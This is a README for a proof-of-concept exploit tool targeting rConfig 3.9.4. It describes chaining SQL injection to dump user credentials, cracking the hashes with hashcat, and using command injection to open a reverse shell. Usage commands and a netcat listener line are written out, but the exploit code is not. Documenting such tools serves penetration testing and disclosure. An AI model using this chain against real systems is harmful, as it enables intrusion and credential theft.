# rConfig 3.9 Combined SQL Injection and Command Injection PoC

## Overview
This PoC targets rConfig version `3.9.4` and demonstrates exploitation through a combination of SQL Injection and Remote Command Injection vulnerabilities. It automates the process of:
1. Extracting database name via SQLi
2. Dumping user credentials from the database
3. Attempting to crack password hashes using hashcat with the `rockyou` wordlist and `best64.rules`
4. Optionally performing Remote Command Execution (RCE) via command injection on the search functionality, using the cracked admin credentials

This script is based on and combines two original PoCs:
- [48208.py](https://www.exploit-db.com/exploits/48208) (SQL Injection) by vikingfr
- [48241.py](https://www.exploit-db.com/exploits/48241) (Command Injection) by Matthew Aberegg and Michael Burkey

It was modified in order to automate cracking and optional shell spawning.

## Requirements
- Python 3
- `requests` library (pip install requests)
- `hashcat` installed and accessible via command line
- `rockyou.txt` wordlist (or equivalent) located at `/usr/share/wordlists/rockyou.txt`
- hashcat rules file `/usr/share/hashcat/rules/best64.rule`

## Usage
To dump users and hashes only:
```bash
python3 rConfig_rce.py https://target
```
To dump users, crack passwords, and attempt RCE (requires attacker IP and port for reverse shell):
```bash
python3 rConfig_rce.py https://target attacker_ip attacker_port
```

## Notes
- If hashcat fails to crack the password, the script suggests using online cracking services such as [CrackStation](https://crackstation.net/).
- If the password hash cannot be cracked automatically, you will be prompted to input the plaintext password manually for RCE attempts.
- The script prioritizes using the `admin` account for the command injection phase.
- Make sure to have a listener (e.g., `nc -lvnp 80`) running on your attacker machine to catch the reverse shell.

## Disclaimer
This tool is intended for authorized security testing and educational purposes only. Unauthorized use against systems without permission is illegal and unethical.
